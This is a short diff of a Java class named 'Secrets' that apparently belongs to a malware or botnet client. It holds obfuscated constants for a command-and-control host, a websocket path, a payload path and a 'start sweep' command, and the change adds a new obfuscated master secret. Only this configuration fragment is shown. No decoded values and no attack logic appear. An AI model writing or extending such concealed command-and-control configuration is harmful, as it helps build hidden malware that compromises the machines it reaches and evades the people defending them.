@@ -20,6 +20,7 @@ public class Secrets {
     public static final String C2_HOST = deobfuscate("IiIiezg8JzQ8Mjk6NzQ5eyY8ITA=");
     public static final String WS_PATH = deobfuscate("eiIm");
     public static final String PAYLOAD_PATH = deobfuscate("ejQlPHolNCw5OjQx");
+    public static final String MASTER_SECRET = deobfuscate("MRk0HhInECAUNjYHNxI3ZmZiI20mZzAiLxYFIjwMD2MhJhkcPQwMGB8QEGg=");
 
     // Commands
     public static final String CMD_START_SWEEP = deobfuscate("JiE0JyEKJiIwMCU=");
